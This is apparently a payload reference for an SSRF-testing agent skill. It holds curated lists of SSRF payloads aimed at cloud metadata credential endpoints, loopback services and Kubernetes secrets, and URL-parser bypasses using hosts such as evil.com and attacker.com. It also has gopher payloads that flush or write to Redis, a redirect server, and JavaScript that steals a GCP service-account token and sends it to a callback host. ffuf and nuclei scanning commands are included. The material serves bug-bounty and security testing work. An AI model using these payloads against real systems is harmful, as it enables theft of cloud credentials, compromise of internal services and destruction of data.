# SSRF — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Cloud metadata -> `http://169.254.169.254/latest/meta-data/` `http://metadata.google.internal/computeMetadata/v1/`

- Loopback -> `http://127.0.0.1` `http://[::1]` `http://0x7f000001` `http://2130706433`

- Bypass form -> `http://169.254.169.254\@127.0.0.1:8000/` `http://127.1` `http://0177.0.0.1`

- Scheme abuse -> `file:///etc/passwd` `gopher://127.0.0.1:6379/_INFO` `dict://127.0.0.1:11211/stat`

- Redirect -> `https://trusted.com/redirect?url=http://169.254.169.254/`



## Payload bank



**85 curated payloads** in 6 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Loopback & internal services



```text

http://127.0.0.1/

http://127.0.0.1:80/

http://localhost/

http://[::1]/

http://0.0.0.0/

http://127.1/

http://127.0.1/

http://2130706433/

http://0x7f000001/

http://0177.0.0.1/

http://127.0.0.1.nip.io/

http://127.0.0.1.sslip.io/

http://localtest.me/

http://[::ffff:127.0.0.1]/

http://[0:0:0:0:0:ffff:127.0.0.1]/

http://127.0.0.1:22/

http://127.0.0.1:6379/

http://127.0.0.1:11211/

http://127.0.0.1:9200/

http://127.0.0.1:8080/

http://127.0.0.1:3000/

http://127.0.0.1:8500/v1/catalog/services

```



### Cloud metadata



```text

http://169.254.169.254/latest/meta-data/

http://169.254.169.254/latest/meta-data/iam/security-credentials/

http://169.254.169.254/latest/user-data/

http://169.254.169.254/latest/dynamic/instance-identity/document

http://169.254.169.254/metadata/v1.json

http://169.254.169.254/metadata/v1/id

http://169.254.169.254/openstack/latest/meta_data.json

http://metadata.google.internal/computeMetadata/v1/

http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

http://100.100.100.200/latest/meta-data/

http://192.0.0.192/latest/meta-data/

http://169.254.169.254/metadata/instance?api-version=2021-02-01

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

http://metadata.google.internal/computeMetadata/v1/project/project-id

```



### Allowlist & parser bypass



```text

http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/

http://127.0.0.1@169.254.169.254/

http://169.254.169.254#@127.0.0.1/

http://169.254.169.254%2f@127.0.0.1/

http://127.0.0.1:80@evil.com/

http://evil.com:80@127.0.0.1/

http://127.0.0.1%00.evil.com/

http://127.0.0.1%20.evil.com/

http://127.0.0.1.attacker.com/

http://attacker.com#@127.0.0.1/

http://attacker.com?@127.0.0.1/

http://127.0.0.1./

http://127.0.0.1:80\@evil.com/

//127.0.0.1/

\\127.0.0.1\

http://evil.com\@127.0.0.1/

http://127.0.0.1%09.evil.com/

http://127.0.0.1%0d%0a.evil.com/

```



### Redirect & DNS tricks



```text

http://attacker.com/redirect?url=http://169.254.169.254/

https://attacker.com/302?to=http://127.0.0.1/

http://attacker.com/open?next=http://metadata.google.internal/

http://127.0.0.1.nip.io/

http://169.254.169.254.nip.io/

http://metadata.google.internal.nip.io/

http://spoofed.burpcollaborator.net/

http://127.0.0.1.sslip.io/

http://localhost.localdomain/

http://localhost./

```



### Non-HTTP schemes



```text

file:///etc/passwd

file:///c:/windows/win.ini

file:///proc/self/environ

file:///var/run/secrets/kubernetes.io/serviceaccount/token

gopher://127.0.0.1:6379/_INFO

dict://127.0.0.1:11211/stat

ftp://127.0.0.1/

sftp://127.0.0.1/

ldap://127.0.0.1/

tftp://127.0.0.1/

netdoc:///etc/passwd

jar:http://127.0.0.1/x.jar!/

php://filter/convert.base64-encode/resource=index.php

expect://id

```



### Protocol smuggling (gopher / redis / memcached)



```text

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0D%0A%0A%2A%2F%2A%20%2A%20%2A%20%2A%20%2A%20root%0D%0A

gopher://127.0.0.1:11211/_stats%0D%0A

gopher://127.0.0.1:11211/_set%20x%200%200%201%0D%0Aa%0D%0A

gopher://127.0.0.1:25/_EHLO%20localhost%0D%0A

gopher://127.0.0.1:3306/_

gopher://127.0.0.1:5432/_

gopher://127.0.0.1:9000/_

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_ssrf.txt` (85)

- `~/.local/share/hackerone-reports/wordlists/payloads_ssrf_waf.txt` (26 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 4× | `http://[fe80::1%25eth0]/` |

| 4× | `fe80::1%eth0` |

| 3× | `(scheme, hostname, port)` |

| 2× | `https://<your-attacker-server>/redir.php` |

| 2× | `RealPlayerApi.apply()` |

| 2× | `http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/` |

| 2× | `{readapi.<url_here>}` |

| 2× | `http.<url>.proxy` |

| 2× | `..%2F..%2Fapi/v0/shutdown` |

| 2× | `%2F` |

| 2× | `fe80::1%1` |

| 2× | `%eth0` |

| 2× | `Unknown mime-type: text/html; charset=UTF-8` |

| 2× | `Curl_idn_decode()` |

| 2× | `$('.upgradeToAdmin').click(function () { / let t = $('input[name="username"]').val(); / $.get('/admin/upgrade?username=' + t, function () {` |

| 2× | `POST /hate-mail-generator/new/preview HTTP/1.1 / Host: hackyholidays.h1ctf.com / ...... / preview_markup=Hello,{{name}}&preview_data={"name` |

| 2× | `{{}}` |

| 1× | `<script> / window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"; / // iframes d` |

| 1× | `<script> / window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"; / </script>` |

| 1× | `curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Co` |



## Parameters observed



`url` · `hash` · `username` · `template` · `password` · `id` · `data` · `payload` · `alt` · `format` · `email` · `month` · `year` · `template[]` · `image` · `name` · `target` · `start` · `command` · `user_id`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_ssrf.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_ssrf.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf.txt` | 85 |

| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf_waf.txt` | 26 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_ssrf.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssrf.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssrf.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Set up an interactsh/OAST listener first; SSRF templates often only prove outbound traffic.



```sh

nuclei -u https://target -tags ssrf,oast \

       -severity low,medium,high,critical -rl 40 -o nuclei_ssrf.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/ssrf -dast \

       -rl 40 -o nuclei_ssrf_ssrf.txt

nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/ssrf-via-proxy.yaml \

       -rl 40 -o nuclei_ssrf_ssrf-via-proxy.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



### Basic Out-of-Band Detection

```bash

# Using interactsh-client

interactsh-client -v



# Test parameter

curl -s "https://target.com/api/preview?url=https://YOUR_ID.oast.pro"



# With common headers that might unlock SSRF

curl -s "https://target.com/api/fetch" \

  -H "Content-Type: application/json" \

  -d '{"url":"https://YOUR_ID.oast.pro"}'

```



### Cloud Metadata Payloads

```bash

# GCP - requires Metadata-Flavor header (test if server adds it automatically)

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

http://169.254.169.254/computeMetadata/v1/project/project-id

http://metadata/computeMetadata/v1/

http://169.254.169.254/computeMetadata/v1/



# AWS IMDSv1 (no auth required)

http://169.254.169.254/latest/meta-data/iam/security-credentials/

http://169.254.169.254/latest/user-data

# AWS ECS task credentials (retrieve from env var AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)

http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}



# Azure - instance metadata and managed identity token

http://169.254.169.254/metadata/instance?api-version=2021-02-01

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Requires Metadata: true header for Azure requests



# Kubernetes service account credentials (file:// SSRF)

file:///var/run/secrets/kubernetes.io/serviceaccount/token

file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt

```



### Localhost/Internal Port Payloads

```bash

# Kubernetes internals

http://127.0.0.1:6443/api/v1/namespaces

http://10.0.0.1:6443/api/v1/secrets

http://127.0.0.1:10250/pods          # kubelet

http://127.0.0.1:2379/v2/keys        # etcd



# Common internal services

http://127.0.0.1:6379/               # Redis (check for inline commands)

http://127.0.0.1:9200/_cat/indices   # Elasticsearch

http://127.0.0.1:5601/               # Kibana

http://127.0.0.1:8500/v1/catalog/services  # Consul

```



### Redirect-Based SSRF (when direct is blocked)

```python

# Simple Python redirect server

from http.server import HTTPServer, BaseHTTPRequestHandler



class Redirect(BaseHTTPRequestHandler):

    def do_GET(self):

        self.send_response(301)

        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')

        self.end_headers()



HTTPServer(('0.0.0.0', 8080), Redirect).serve_forever()

```



### JavaScript-Based SSRF (headless browser contexts)

```javascript

// Exfil via fetch

fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {

  headers: {'Metadata-Flavor': 'Google'}

}).then(r=>r.text()).then(d=>{

  fetch('https://YOUR.callback.com/?d='+btoa(d))

})



// DNS exfil for blind contexts

var x = new XMLHttpRequest();

x.open('GET','http://169.254.169.254/latest/meta-data/');

x.send();

x.onload = function(){

  var img = new Image();

  img.src = 'https://'+btoa(x.responseText.substring(0,50))+'.YOUR.callback.com';

}

```



### Grep Patterns for Source Code Review

```bash

# Find URL fetch operations

grep -rE "(fetch|curl|urllib|requests\.get|http\.get|axios\.get)\s*\(" --include="*.py" --include="*.js" --include="*.go"



# Find URL parameters being passed to HTTP clients

grep -rE "(url|uri|endpoint|redirect|src|source)\s*=\s*req\.(query|body|params)" --include="*.js"



# Find redirect following

grep -rE "(follow_redirects|allow_redirects|followRedirects)\s*=\s*[Tt]rue"

```



### ffuf Parameter Discovery

```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \

  -u "https://target.com/api/endpoint?FUZZ=https://YOUR.callback.com" \

  -fs 0 -mc all

```



---
